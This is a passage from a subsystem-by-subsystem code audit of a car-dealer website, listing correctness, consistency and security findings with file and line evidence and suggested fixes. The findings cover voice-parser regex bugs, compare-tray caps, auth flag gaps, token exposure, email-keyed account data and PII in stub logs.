**What it is —** configureAI() stores config in a module-level `let` (per-isolate on Workers) and, once set, THROWS if re-called with a config whose JSON.stringify differs from the stored one. src/pages/api/chat.ts (line 25) and src/pages/api/search.ts (line 165) both configure with `streamAttemptTimeoutMs: REQUEST_TIMEOUT_MS` — search.ts even comments that it matches chat 'BYTE-FOR-BYTE'. But src/pages/api/generate-description.ts (line 175) configures WITHOUT the streamAttemptTimeoutMs key (all other fields — key, referer, appTitle, attemptTimeoutMs — are identical, imported from the same ~/chatbot/config constants). Because Cloudflare reuses isolates across requests and no endpoint calls resetAIConfig(), whichever family of endpoints runs second on a warm isolate hits configureAI's mismatch throw. The stored config is a strict subset/superset of the incoming one, so JSON.stringify never matches and the early-return idempotency path is skipped.

**Evidence —** src/ai/config.ts:49-55 throws 'configureAI() called again with different values' on JSON.stringify inequality. chat.ts:25-32 and search.ts:165-171 pass streamAttemptTimeoutMs; generate-description.ts:175-180 does NOT. All three import APP_URL/APP_TITLE/REQUEST_TIMEOUT_MS from '~/chatbot/config' (identical values). The configureAI call at generate-description.ts:175 sits between the try blocks at 167-172 and 264-282 — it is NOT wrapped in try/catch, and chat.ts:25 is likewise unguarded inside the POST handler (chat.ts:18). No resetAIConfig() call exists in any endpoint (grep confirmed). So the throw propagates uncaught → the Astro/Cloudflare adapter returns HTTP 500, defeating both endpoints' deliberate graceful-degradation contract (generate-description otherwise always returns 200; chat is buyer-facing).

**Suggested fix —** Make generate-description.ts's configureAI call include `streamAttemptTimeoutMs: REQUEST_TIMEOUT_MS` so all three call sites are byte-for-byte identical (the fix search.ts already applied). More robustly, extract a single shared configureAI helper so the config object cannot drift, and/or make the config.ts guard tolerant (compare only the openrouterApiKey, or merge rather than throw) so benign field differences never 500.

### 6.2  [LOW] Non-integer / unvalidated maxResults interpolated into GROQ slice bound in executeSearchInventory
**Category:** correctness · **Location:** `src/ai/tools/inventory-tools.ts:186`

**What it is —** executeSearchInventory computes `max = Math.max(1, opts.maxResults ?? DEFAULT_MAX_RESULTS)` and string-interpolates it directly into the GROQ slice `[0...${max}]`. Math.max(1, x) guarantees a lower bound but not an integer — a caller passing a float (e.g. 5.5) would interpolate a fractional slice bound. This is not an injection vector (all filter VALUES go through parameterised $params; only the numeric bound is interpolated) and the feature is gated OFF (ai.agenticSearch.enabled=false) with maxResults today only ever the integer default, so impact is negligible. Flagged for hygiene.

**Evidence —** inventory-tools.ts:171 `const max = Math.max(1, opts.maxResults ?? DEFAULT_MAX_RESULTS);` then :186 `*[${scoped}] | order(price asc) [0...${max}]`. maxResults is typed `number` (RunAgenticSearchOptions), no Math.floor/integer coercion.

**Suggested fix —** Coerce with `Math.floor` (and an upper cap) before interpolation, e.g. `const max = Math.min(50, Math.max(1, Math.floor(opts.maxResults ?? DEFAULT_MAX_RESULTS)));`.

---

## 7. Compare

**Audit summary.** Audited the Compare subsystem (src/pages/compare.astro, compare-tools.astro, src/components/CompareTray.astro, src/components/compare/{reckon.ts,Contender.astro,Dial.astro}, src/lib/compare-verdict.ts, src/pages/api/compare-pick.ts) against the SYSTEM-MAP §7 audit checklist and the hard constraints. The subsystem is in good shape and largely passes. Checklist results: (1) ?ids parsing — PASS: both pages split/trim/filter-blank/dedupe/cap and gate on length>=2; compare-pick requires >=2 refs and short-circuits. (2) Winner heuristic per row — PASS: winners()/deltaText() require all values present, matching units, and no all-tie; verdict/reckon use normDim which drops cars missing a value and returns an empty map when <2 carry it, so no fabricated verdict. (3) compare-pick grounded in the compared set — PASS: fetches only $ids by _id, ranks only those via the shared normDim/SCORE_DIMS, cites real numbers, never invents alternatives, fails open/grounded on errors. (4) No dealerNotes leak — PASS: pages use shared LISTING_FIELDS (dealerNotes excluded) and compare-pick uses an explicit public PICK_PROJECTION. (5) Locale formatting — PASS: formatPrice/fmtNum/leadClause read dealerConfig.locale. Light-theme constraint — PASS (color-scheme:light, no dark: classes). All-AI-through-src/ai — N/A here (compare-pick is deterministic, no LLM; the LLM decision path lives in ChatWidget). Reason strings rendered via innerHTML are HTML-escaped (esc()) in both pages, so no XSS. Findings below are minor edge/consistency issues, not correctness failures of the core scoring.

**Findings: 3**

### 7.1  [MEDIUM] CompareTray allows 4 cars but the board caps at 3 — 4th selection silently dropped
**Category:** consistency · **Location:** `src/components/CompareTray.astro:51`

**What it is —** The compare tray lets a shopper add up to 4 listings (MAX = 4, CompareTray.astro:51) and builds the Compare link with the full selection (compare-go href = /compare?ids=<all ids>, CompareTray.astro:136). Both comparison boards, however, hard-cap the parsed ids at 3 (compare.astro:40 and compare-tools.astro:48 both `.slice(0, 3)`). So a visitor who fills the tray to its advertised maximum of 4 and clicks Compare lands on a board that shows only the first 3 cars, with the 4th dropped and no message explaining why. The dealer-config cap (dealerConfig.chat.context.maxRefs = 4, dealer.ts:806) that bounds /api/compare-pick also disagrees with the board's 3.

**Evidence —** CompareTray.astro:51 `const MAX = 4;`; CompareTray.astro:136 `goEl.href = /compare?ids=${ids.map(encodeURIComponent).join(',')}` (all up to 4); compare.astro:40 `].slice(0, 3);`; compare-tools.astro:48 `].slice(0, 3);`; dealer.ts:806 `maxRefs: 4`.

**Suggested fix —** Pick one cap and share it as config-as-data: either lower the tray MAX to 3 (and dealerConfig maxRefs) so selection can't exceed what the board renders, or raise the board cap to match. Failing that, show an explicit 'showing first 3 of N' notice on the board when ids are truncated.

### 7.2  [LOW] Contender links to /listings/ when a listing has no slug (dead link)
**Category:** correctness · **Location:** `src/components/compare/Contender.astro:24`

**What it is —** On /compare-tools each contender row is a link built as `/listings/${slug}` (Contender.astro:24). The slug is passed from slugById which defaults to '' when a listing lacks slug.current (compare-tools.astro:101, `l.slug?.current ?? ''`, rendered at compare-tools.astro:288 `slug={slugById.get(s.id) ?? ''}`). A car with no published slug therefore renders name/thumbnail links pointing at `/listings/` — a dead link. Notably the compare-pick endpoint already guards this exact case (returns {rankable:false} when a pick has no slug, compare-pick.ts:237-240), but the board UI does not.

**Evidence —** compare-tools.astro:101 `const slugById = new Map(listings.map((l) => [l._id, l.slug?.current ?? '']));`; Contender.astro:24 `const href = /listings/${slug};` used for the row's <a> at Contender.astro:36,48; contrast compare-pick.ts:237 guarding empty slug.

**Suggested fix —** Render the thumbnail/name as non-links (plain span) when slug is empty, or filter slug-less listings out of the compared set before rendering, mirroring the compare-pick guard.

### 7.3  [LOW] Price row winner/delta assumes a single currency across compared cars
**Category:** correctness · **Location:** `src/pages/compare.astro:204`

**What it is —** The price comparison row treats all cars as directly comparable by feeding winners() a synthetic uniform unit array `listings.map(() => 'currency')` (compare.astro:204), so the per-car currency is never checked. If two compared listings carried different currencies (e.g. AUD vs USD), the board would still highlight the numerically-lowest price as the winner and format the delta in listings[0]'s currency (compare.astro:215), which would be misleading. In practice a single dealer's inventory shares one currency, so this is an edge case, not an active bug — but the guard that winners() applies to real units (matching-unit requirement, compare.astro:82-83) is deliberately bypassed for price.

**Evidence —** compare.astro:204 `const priceWin = winners(priceNums, listings.map(() => 'currency'), true);`; compare.astro:215 delta formatted with `listings[0]?.currency` regardless of which car won; winners() unit guard at compare.astro:82-83 requires `units.every((u) => u === unit0)` for every other row.

**Suggested fix —** Pass each car's actual currency as the unit for the price row (or short-circuit price comparison when currencies differ), so mixed-currency sets fall through to 'not comparable' the same way mismatched units do elsewhere.

---

## 8. Capture (dealer PWA)

**Audit summary.** Audited SYSTEM-MAP §8 "Capture" checklist against the real code. Checklist status: (1) create-draft never performs a real Sanity write — PASS (src/stubs/listing-writer.ts logs + returns a mock id, reads no token; create-draft.ts pins status/category and field-whitelists the client draft). (2) Endpoints reject non-allowlisted origins + enforce the capture: rate limit — PASS (http.ts guardCaptureRequest), with the caveat that an Origin-header allowlist is the ONLY auth and is trivially spoofable by non-browser clients (info). (3) pipeline.ts merge invents nothing — PARTIAL: the merge structure is faithful, but the deterministic VOICE parser has two confirmed bugs that emit WRONG values at high/medium confidence (so they are NOT review-flagged), and stubbed vision fields are surfaced as source='vision' high-confidence/unflagged. (4) Sub-threshold make/model prompts "create new?" — PASS (reference-resolver.ts, fail-open). (5) maxImages/maxTranscriptLength enforced server-side — PASS (extract.ts slices both). Separately, the PWA is dark-themed, diverging from the project's light-theme standard (intentional separate surface; noted for owner awareness). Two real correctness/determinism bugs found, both in the voice parser.

**Findings: 5**

### 8.1  [MEDIUM] Spoken price silently captured from the odometer figure ('142k km ... 25 grand' → price $142,000)
**Category:** correctness · **Location:** `src/lib/capture/pipeline.ts:92`

**What it is —** The price parser's 'grand' branch regex /\b(\d[\d,]*)\s*(k|grand|thousand)\b/ scans left-to-right and matches the ODOMETER's '142k' before ever reaching the actual spoken price ('25 grand'), because the odometer is also expressed with a trailing 'k'. This directly contradicts the code's own stated guarantee on lines 86-89 ('Match specifically so the odometer figure is never mistaken for a price'). Price is tracked at 'medium' confidence, so needsReview is false and the wrong money value is NOT flagged in the review UI.

**Evidence —** Executed the exact regexes: parse('142k km, asking 25 grand') => {odo:142000, price:142000}; parse('142k on the clock, asking 25 grand') => {price:142000}. The '$' branch (dollar) avoids it, so the UI placeholder '$25,000' hides the bug, but any dealer saying '25 grand' or '25k' (no dollar sign) with a 'k'-suffixed odometer gets the odometer captured as the price.

**Suggested fix —** Exclude the odometer span before price matching, or anchor the grand/asking price patterns to a price cue and require the number NOT be immediately followed by km/kms/kilometres. E.g. run the price regex on the transcript with the matched odometer substring removed, or add a negative lookahead '(?!\s*(?:km|kms|kilometres))' to the grand branch.

### 8.2  [MEDIUM] Odometer '142k on the clock' parsed as 142 km instead of 142,000 (multiplier lost), marked high-confidence
**Category:** determinism · **Location:** `src/lib/capture/pipeline.ts:76`

**What it is —** In the odometer regex /(\d[\d,]*)\s*(k)?\s*(?:km|kms|kilometres|k on the clock)/ the 'k on the clock' alternative consumes the 'k', so the optional multiplier capture group (k)? backtracks to empty. The 'if (odoMatch[2] === "k") n *= 1000' multiplier therefore never fires and the value is 142 instead of 142,000. The result is stored at 'high' confidence (line 82), so needsReview is false and this wildly-wrong odometer is NOT flagged for dealer review — undermining the review safety net for a hard-fact field.

**Evidence —** Executed the exact regex: parse('142k on the clock') => {odo:142}; parse('142k on the clock, asking 25 grand') => {odo:142}. Contrast parse('142k km') => {odo:142000} (works, because the 'km' alternative leaves the 'k' for the multiplier group). The 'k on the clock' alternative was clearly added deliberately (line 76) yet breaks the multiplier for exactly that phrasing.

**Suggested fix —** Make the multiplier independent of the unit alternative, e.g. match the 'k' multiplier and the unit separately, or add a post-match check: if the raw matched text contains 'k' between the digits and the unit, multiply by 1000. Also consider dropping odometer confidence from 'high' so a mis-parse is at least review-flagged.

### 8.3  [LOW] Stubbed/fabricated vision fields surfaced as source='vision', high-confidence, needsReview=false
**Category:** determinism · **Location:** `src/lib/capture/pipeline.ts:144`

**What it is —** extractFromImage (src/stubs/vision-extract.ts:82-99) fabricates colour/bodyType from a hash of the filename and labels them confidence 'high'. In the pipeline, visionCand records source 'vision' (there is no 'stub' FieldSource), so the assembled colour field is source='vision' + confidence='high' + needsReview=false. The review UI (index.astro:288-291) then badges completely invented demo data as 'vision'/'high' with no review highlight. The extract endpoint's meta.visionStub flag is the only signal it was stubbed, and the UI does not use it per-field. This is inherent to the demo stub, but it means invented data is not review-flagged, which sits in tension with the checklist's 'invents nothing' intent.

**Evidence —** vision-extract.ts:94-95 sets colour {confidence:'high'} from COLOUR_CYCLE[h % 6]; pipeline.ts:173 set('colour', pick(visionCand('colour'))) with visionCand (line 144-147) using source:'vision'; FieldSource type (types.ts:14) has no 'stub' member so real and stub paths are indistinguishable per-field.

**Suggested fix —** Either propagate the ExtractedFields.source ('stub'|'ai-vision') into the per-field TrackedField source, or force needsReview=true for vision-sourced fields while STUB_VISION is active, so fabricated demo values are always highlighted for the dealer.

### 8.4  [INFO] Capture PWA is dark-themed, diverging from the project light-theme standard
**Category:** design-consistency · **Location:** `src/pages/capture/index.astro:40`

**What it is —** Project memory records a light-theme-first standard for new UI (bg-slate-50/white/slate-900). The capture page hardcodes a dark palette (color-scheme: dark; background #0b1220; theme_color #0b1220 in manifest.webmanifest.ts:23-24). This is arguably justified — it is a deliberately standalone installable dealer tool, not the shopper site, and the SYSTEM-MAP §8 constraints do not list light-theme for capture — but it is a visible divergence worth owner awareness.

**Evidence —** index.astro:40 ':root { color-scheme: dark; }' and :42-49 body background #0b1220; manifest.webmanifest.ts:23-24 background_color/theme_color '#0b1220'. Contrast the light-theme MEMORY note and the shopper pages.

**Suggested fix —** Confirm with owner whether the dealer PWA should stay dark or align to the light-theme system. No code change if intentional.

### 8.5  [INFO] Capture endpoints authenticated only by a spoofable Origin header (no Turnstile / auth)
**Category:** security · **Location:** `src/lib/capture/http.ts:34`

**What it is —** guardCaptureRequest gates the three capture endpoints solely on the Origin request header against dealerConfig.capture.allowedOrigins, plus a fail-open per-IP rate limit. The Origin header is trivially set by any non-browser client (curl/script), so the allowlist stops cross-site browser calls but not direct abuse; there is no Turnstile or session auth (unlike chat). Because every external is stubbed and no real write occurs, blast radius is currently limited to stub CPU + the fail-open rate cap (40/hr/IP), so this is acceptable today — but it must be revisited before the real Sanity write / paid NEVDIS+vision paths are wired, since those endpoints would then be an unauthenticated cost/write surface.

**Evidence —** http.ts:34-37 origin allowlist is the only identity check; :43-58 rate limit is fail-open and skipped entirely when RATE_LIMIT_KV is unbound; no Turnstile import anywhere under src/pages/api/capture/*. dealer.ts:996 rateLimit {windowSeconds:3600, maxRequests:40}.

**Suggested fix —** Before enabling the live VIN/vision/write paths, add stronger auth (dealer session or a signed token) to /api/capture/* rather than relying on the Origin allowlist alone.

---

## 9. Accounts & authentication

**Audit summary.** Audited src/lib/supabase.ts, src/actions/index.ts, src/middleware.ts, and the /login /signup /account /check-email /reset-password pages + AuthCard/AuthLayout against SYSTEM-MAP §9 checklist. PASS: Turnstile is verified before every Supabase call (fail-closed); /account is guarded and authed users are bounced off /login+/signup; password-reset avoids account enumeration; fail-open D1 helpers log no PII. FAIL / weaknesses: (1) the accounts.enabled flag does NOT gate the Astro actions, so signUp/signIn/requestPasswordReset stay callable when the feature is 'off' — the surface is not fully disabled; (2) signIn returns the full session (access+refresh tokens) in the JSON body, weakening the httpOnly cookie posture; (3) the /account dashboard joins D1 saved-searches/service-bookings purely by email with no enforcement that the email is confirmed/owned — cross-user PII exposure if Supabase email confirmation is off; (4) no per-IP rate limiting on auth actions (reserved account: counter unused); (5) the anti-bot honeypot is client-side only; (6) Supabase SSR cookies use library-default options with no explicit httpOnly/secure/sameSite hardening. Items 3 and 6 fall squarely under the mandated pre-launch paid security review.

**Findings: 6**

### 9.1  [MEDIUM] accounts.enabled flag does not disable the auth actions — surface not fully off
**Category:** constraint-violation · **Location:** `src/actions/index.ts:83`

**What it is —** SYSTEM-MAP §9 states accounts.enabled is 'the single on/off seam for the whole surface (off = every route redirects home and the middleware no-ops)'. The pages (login/signup/account/check-email/reset-password) and middleware.ts do gate on dealerConfig.accounts.enabled, but the Astro actions in src/actions/index.ts never reference the flag. Astro registers these actions globally and exposes them at /_actions/<name> regardless of the flag, so signUp/signIn/requestPasswordReset/updatePassword remain fully live when accounts is supposedly disabled. An attacker can still create Supabase users and trigger password-reset emails (email bombing) against a 'disabled' feature. This fails the checklist item 'accounts.enabled=false fully disables the surface'.

**Evidence —** src/actions/index.ts has no import of dealerConfig and no enabled check anywhere (grep for 'accounts'/'enabled'/'dealerConfig' returns nothing); the whole `export const server = {...}` block (line 83) is always registered. By contrast every page guards with `if (!dealerConfig.accounts.enabled) return Astro.redirect('/', 302)` (e.g. login.astro:12, account.astro:27) and middleware.ts:55 no-ops when the flag is off.

**Suggested fix —** Add a `if (!dealerConfig.accounts.enabled) throw new ActionError({ code: 'NOT_FOUND', ... })` guard at the top of each action handler (or a shared wrapper), mirroring the page-level flag guard, so the flag is a true single seam.

### 9.2  [MEDIUM] signIn action returns access + refresh tokens in the JSON response body
**Category:** security · **Location:** `src/actions/index.ts:173`

**What it is —** The signIn handler returns `{ success, user, session: data.session }`. The Supabase session object contains the access_token and refresh_token. These are already set as (httpOnly) cookies by the SSR client's setAll, so echoing them back in the action's JSON response is unnecessary and exposes the raw tokens to client-side JavaScript — defeating the point of httpOnly cookies and turning any XSS on the auth surface into full token theft. The client (AuthCard) only reads data.success, so the session field is unused payload.

**Evidence —** src/actions/index.ts:170-174 returns `session: data.session`; the consuming code in AuthCard.astro:437-444 only checks `data?.success`. Cookies are separately synced via getSupabase().setAll (src/lib/supabase.ts:33-41).

**Suggested fix —** Return only `{ success: true }` (or a minimal user projection) from signIn; never serialize data.session to the response body.

### 9.3  [MEDIUM] Account dashboard joins per-user D1 data by email with no ownership enforcement
**Category:** security · **Location:** `src/pages/account.astro:55`

**What it is —** The /account page reads saved_searches and service_bookings solely by `WHERE lower(email) = lower(?)` using the logged-in user's email. saved_searches/service_bookings are populated by ANONYMOUS visitors who type an email into the service/saved-search forms. Ownership of that email is only guaranteed if Supabase email confirmation is enforced. The signUp handler explicitly supports the auto-confirmed path ('You are now logged in.', hasSession true), so if the Supabase project has email confirmation disabled, anyone can register victim@example.com without owning it and view that email's service bookings (vehicle, preferred date) and saved searches — cross-user PII exposure. This is exactly the class of issue the mandated pre-launch paid security review must catch.

**Evidence —** account.astro:55-58 calls getSavedSearchesByEmail/getBookingsByEmail with userEmail; saved-search.ts:141 and service-booking.ts:181 match purely on `lower(email) = lower(?)`; signUp (index.ts:126-137) handles and messages the auto-confirmed (no-email-verification) path.

**Suggested fix —** Confirm email verification is enforced in the Supabase project before any real PII launch, and/or gate the by-email dashboard reads on `user.email_confirmed_at`/`user.confirmed_at` being set. Document the required Supabase auth config in TODO_KEYS.md.

### 9.4  [LOW] No per-IP rate limiting on auth actions despite reserved config
**Category:** security · **Location:** `src/actions/index.ts:41`

**What it is —** The auth actions rely only on Cloudflare Turnstile for abuse protection; there is no per-IP fixed-window throttle. dealerConfig.accounts.rateLimit ({ windowSeconds: 3600, maxRequests: 20 }) is declared and the project has a shared checkRateLimit helper (src/lib/rate-limit.ts, used by chat/capture/service with distinct KV prefixes), but neither is wired into signIn/signUp/requestPasswordReset. Turnstile blocks naive bots but does not bound credential-stuffing or reset-email volume from a solver-backed client. The config comment even concedes the limiter is only 'reserved'.

**Evidence —** grep for rateLimit/checkRateLimit/RATE_LIMIT in src/actions/index.ts returns nothing; dealer.ts:977 defines accounts.rateLimit with a comment 'Reserved per-IP cap for future account endpoints'.

**Suggested fix —** Apply checkRateLimit with an `account:` keyPrefix keyed on cf-connecting-ip inside the signIn/signUp/requestPasswordReset handlers, using dealerConfig.accounts.rateLimit.

### 9.5  [LOW] Honeypot anti-bot check is client-side only
**Category:** security · **Location:** `src/components/auth/AuthCard.astro:370`

**What it is —** The signup/login form's honeypot ('website' field) is only validated in the browser (AuthCard validateForm). The server actions never receive or inspect a honeypot field, so calling the action directly bypasses it entirely. Turnstile still gates the action, so the practical exposure is low, but the honeypot provides no server-side value as implemented.

**Evidence —** AuthCard.astro:370-373 checks `honeypotInput.value` client-side; the signUp action input schema (index.ts:86-91) has no honeypot field and the handler never checks one (grep for 'website'/'honeypot' in src/actions/index.ts is empty).

**Suggested fix —** Either drop the honeypot as decorative, or add the field to the action input schema and reject non-empty submissions server-side.

### 9.6  [LOW] Supabase SSR cookies use library-default options (no explicit httpOnly/secure/sameSite)
**Category:** security · **Location:** `src/lib/supabase.ts:25`

**What it is —** getSupabase() calls createServerClient without passing cookieOptions, so the auth cookies are written with whatever @supabase/ssr defaults apply, forwarded verbatim to Astro's cookies.set in setAll. There is no explicit httpOnly/secure/sameSite hardening at this seam, and setAll swallows all errors. The checklist item 'session/refresh cookies are httpOnly/secure/SameSite-correct' cannot be confirmed from the code alone and should be verified/hardened during the mandated security review.

**Evidence —** src/lib/supabase.ts:25-43 — createServerClient(url, key, { cookies: { getAll, setAll } }) with no cookieOptions; setAll (33-41) forwards `options` from the library and has an empty catch.

**Suggested fix —** Pass an explicit cookieOptions ({ httpOnly: true, secure: true, sameSite: 'lax', path: '/' }) to createServerClient and verify the emitted Set-Cookie headers on a real login before PII launch.

---

## 10. Saved searches & service bookings

**Audit summary.** All six §10 checklist items verified. PASS: fail-open persistence (saveSearch/saveBooking guard+try/catch, endpoints never 500); serviceTypes allow-list enforced server-side (book-service.ts:108); distinct KV prefixes (savedsearch:/service:, unique across all 7 endpoints); service copy frames a request not a confirmed slot (dealer.ts:946-967). Prod-migration apply is owner infra (N/A to code). Re-run links: PARTIAL (rerunHref concatenates instead of using canonical helpers). No dealerNotes/all-AI-through-src-ai/determinism violations in scope; light-theme honoured on /service and /account. One medium finding (unverified-email cross-account injection in the by-email path) plus two low findings.

**Findings: 3**

### 10.1  [MEDIUM] By-email access path trusts unverified email, enabling cross-account content injection into /account
**Category:** authz-data-integrity · **Location:** `src/pages/api/saved-search.ts:136`

**What it is —** /api/saved-search and /api/book-service are anonymous (no session, 'no account needed') and accept an arbitrary caller-supplied email that is stored on the row. /account then reads a logged-in user's data BY EMAIL (getSavedSearchesByEmail/getBookingsByEmail, account.astro:56-57, lower(email)=lower(?)). Since the write side never verifies email ownership, anyone who knows a victim's account email can POST saved searches and bookings under it; those rows appear inside the victim's authenticated account view with attacker-controlled free text (label, service_type, vehicle, preferred_date). Astro auto-escapes so no XSS, but it is a real spoofing/data-pollution/phishing-content vector on a trusted page. The read side does not leak other users' data; the flaw is write-side trust of an unverified ownership key.

**Evidence —** api/saved-search.ts:98-136 accepts any email with no auth; saved-search.ts:141 getSavedSearchesByEmail WHERE lower(email)=lower(?); account.astro:56-57 reads by userEmail, renders s.label (213) and b.service_type/vehicle/preferred_date (176-181).

**Suggested fix —** Verify email ownership (double opt-in/token) before attributing rows to an account, or key /account to Supabase user_id, or additionally require the visitor_id cookie to match.

### 10.2  [LOW] Re-run href built by raw string concat, bypassing canonical filter-URL helpers
**Category:** filter-state-constraint · **Location:** `src/pages/account.astro:67`

**What it is —** AGENTS.md: filter URLs go only through the canonical helper. rerunHref() builds /?<qs>#inventory by concatenating the stored query rather than round-tripping via serializeFilters/hrefFor. Mitigated because the stored query was produced canonically, the landing page re-parses via parseFilters, and applyFilterUrl is client-only (unusable in SSR). But the stored query is attacker-suppliable (only trimmed/512-capped, never validated as canonical params) and emitted verbatim into the href (attribute-escaped, same-origin, low impact).

**Evidence —** account.astro:67-70 returns /?<qs>#inventory with no serializeFilters/hrefFor call; canonical helpers live in src/lib/listings-query.ts; stored query only trimmed in api/saved-search.ts:103.

**Suggested fix —** Parse the stored query via parseFilters and re-emit through serializeFilters/hrefFor so the link is guaranteed canonical and self-sanitising.

### 10.3  [LOW] By-email queries lack an email index (full scan); by-visitor_id read helpers exported but unused
**Category:** efficiency-deadcode · **Location:** `migrations/0004_saved_searches.sql:12`

**What it is —** Both migrations index only (visitor_id, created_at) (0004:12, 0005:19), but the only wired read paths are the by-email queries filtering on lower(email) with no supporting index (full table scan per /account load). Demo-safe, degrades in prod. Separately, getSavedSearches (saved-search.ts:104) and getBookings (service-booking.ts:144) are exported but have no callers in src/ (only ByEmail variants used) i.e. dead code.

**Evidence —** migrations 0004:12 and 0005:19 index (visitor_id, created_at) only; active reads use lower(email)= (saved-search.ts:141, service-booking.ts:181); grep finds no callers of the non-ByEmail helpers.

**Suggested fix —** Add a lower(email) index to both tables; remove or wire up the unused by-visitor_id helpers.

---

## 11. Trade-in / valuation

**Audit summary.** Audited the Trade-in / valuation subsystem: src/pages/trade-in.astro, src/pages/api/trade-in.ts, src/stubs/redbook.ts, plus dealerConfig.tradeIn (src/config/dealer.ts) and the shared rate limiter (src/lib/rate-limit.ts). All four SYSTEM-MAP audit-checklist items PASS: (1) valuation is clearly framed as indicative — stub disclaimer, an "Indicative estimate" amber badge, the subheading, and the footer all disclaim precision and require inspection; (2) inputs are validated server-side (make/model non-empty, year integer within 1950..currentYear+1, odometer 0..1,000,000, condition in an allow-list) and the KV rate limit uses a DISTINCT 'tradein:' prefix — I confirmed against all other call sites (search:, desc:, savedsearch:, service:, carsales:, capture:) that there is no collision; (3) there is no 500 path — JSON parse, rate-limit check, and valuation compute are each guarded, and the only compute failure returns HTTP 200 {error}; (4) going live is credential+flag only (useStub = !REDBOOK_API_KEY || truthy(STUB_REDBOOK)) with the live branch a drop-in throw and the stub sharing the exact TradeInInput→TradeInValuation contract. Constraint checks: config-as-data honoured (enabled/rateLimit/copy/locale/currency all read from dealerConfig; no hardcoded dealer values); no AI and no dealerNotes touched (nothing to leak); the valuation stub is fully deterministic (string-hash pseudo-base, request-time clock passed in, no Math.random/module-level Date) which matches the determinism intent and is clearly labelled confidence:'stub'; page is light-theme throughout (bg-slate-50/white/slate-900). The subsystem is essentially clean — only two low/info observations below, no real bugs or constraint violations.

**Findings: 2**

### 11.1  [LOW] POST body is fully parsed before the rate-limit slot, and make/model have no length bound
**Category:** robustness · **Location:** `src/pages/api/trade-in.ts:82`

**What it is —** request.json() runs (trade-in.ts:82) before the per-IP rate-limit check (trade-in.ts:115-117), and make/model are accepted as arbitrary-length trimmed strings with no maximum length (trade-in.ts:88-91). A caller can POST a very large JSON body and have it parsed before consuming any rate-limit budget. This is a deliberate trade-off (the comment at line 79 states parse+validate happen before spending a rate-limit slot so validation errors don't burn quota), and Cloudflare Workers imposes its own request-body size ceiling, so real-world impact is minimal. make/model are only used for hashing in pseudoBaseValue and are never echoed back in the response, so there is no reflection/XSS surface.

**Evidence —** trade-in.ts:82 `body = await request.json();` executes before the KV rate-limit at trade-in.ts:115-117; make/model validated only for non-empty at trade-in.ts:88-91 with no max-length cap.

**Suggested fix —** Optionally cap make/model length (e.g. reject > 100 chars with a 400) and/or guard Content-Length before parsing. Low priority given Cloudflare's platform limits and that inputs aren't reflected.

### 11.2  [INFO] Validation and flag-off return 400/404, not the HTTP-200 {error} the SYSTEM-MAP prose implies
**Category:** documentation · **Location:** `src/pages/api/trade-in.ts:75`

**What it is —** The SYSTEM-MAP data-flow prose (docs/SYSTEM-MAP.md:497-498) summarises the endpoint as returning '{ valuation } (or { error }) at HTTP 200'. In the code, flag-off returns 404 (trade-in.ts:75), invalid JSON returns 400 (trade-in.ts:84), field validation returns 400 (trade-in.ts:90-110), and rate-limit returns 429 (trade-in.ts:119); only the valuation-compute failure returns 200 {error} (trade-in.ts:150). This is CORRECT behaviour and satisfies the actual checklist item (which specifies 'not 500') — the client handles it via `!res.ok` (trade-in.astro:238). It is only a looseness in the map's prose, not a code defect. Flagging so the map isn't misread as requiring 200 for all errors.

**Evidence —** trade-in.ts:75 (404), :84 (400), :90-110 (400), :119 (429), :150 (200 on compute failure); client at trade-in.astro:238 branches on `!res.ok || !body.valuation`.

**Suggested fix —** No code change needed. Optionally tighten the SYSTEM-MAP wording to 'validation/flag errors return 4xx {error}; unexpected compute failures degrade to HTTP 200 {error} — never a 500.'

---

## 12. Stubs & integration registry

**Audit summary.** Audited all 10 stubs in src/stubs/* against the SYSTEM-MAP §12 checklist and their callers. Checklist results: (1) Every stub has a matching TODO_KEYS.md row — PASS (redbook, email, price-history, manufacturer, reviews, websearch, carsales, vin-lookup, vision-extract, listing-writer all registered; voice is client Web Speech). (2) No stub emits fabricated data as real without an honest frame or env gate — PASS (price-history is env-gated at the data layer and OFF by default; trade-in carries confidence:'stub' + disclaimer; grounding stubs are price-free). (3) Grounding stubs stay price-free + firewall-excluded even when enabled — PASS (index.ts builds the anti-hallucination allow-list from `base` WITHOUT manufacturer/reviews/websearch, and the resolve wrappers additionally run stripPrices). (4) listing-writer performs no real write; go-live needs a Worker-scoped token — PASS (logs + returns mock draft id, create-draft.ts never touches a token). (5) Determinism — PASS (every stub uses a stable rolling hash, no Math.random, no module-level new Date(); request-time clock passed in where needed). (6) Auto-stub gating (useStub) correct for spend/PII-bearing integrations — PASS (VIN ~AU$0.65/lookup, carsales, redbook, email all auto-stub while the credential is absent, and the real branch throws rather than silently spending; extract.ts VIN path returns null instead of calling anything when a key is present). Two real issues found, both low/medium — see findings. No fabricated data reaches shoppers and no stub is wired to real spend.

**Findings: 2**

### 12.1  [MEDIUM] Email stub logs the customer's email address (PII) to Worker console
**Category:** pii-in-logs · **Location:** `src/stubs/email.ts:51`

**What it is —** sendEmail() unconditionally runs `console.log(`[email:stub] → ${msg.to} : ${msg.subject}`)`. `msg.to` is the shopper's real email address in both live-shipping features that call this stub: saved-search.ts (to: email, line 143) and book-service.ts shopper confirmation (to: email, line 179). Because the stub is the DEFAULT active path (useStub = !env.RESEND_API_KEY || truthy(env.STUB_EMAIL), and no RESEND_API_KEY is configured yet), every saved-search/service-booking submission in production today writes a customer email address into the Worker logs. Cloudflare observability is enabled (wrangler.jsonc), so these logs are retained. This violates the SYSTEM-MAP cross-cutting 'No PII in logs' constraint (§3, and §9 checklist 'No PII in logs').

**Evidence —** src/stubs/email.ts:51 `console.log(`[email:stub] → ${msg.to} : ${msg.subject}`)`; caller src/pages/api/saved-search.ts:143 `to: email`; caller src/pages/api/book-service.ts:179 `to: email`; observability enabled in wrangler.jsonc.

**Suggested fix —** Drop the recipient from the log line (log only a hashed/redacted id or just the subject), e.g. `console.log('[email:stub] send', { subject: msg.subject, id })`, matching the deterministic stub-id it already computes. Do not log raw msg.to.

### 12.2  [LOW] manufacturer/reviews/websearch stubs ignore useStub — adding the API key is a silent no-op, contradicting the 'config change, not a code change' claim
**Category:** registry-accuracy · **Location:** `src/chatbot/grounding/manufacturer.ts:56`

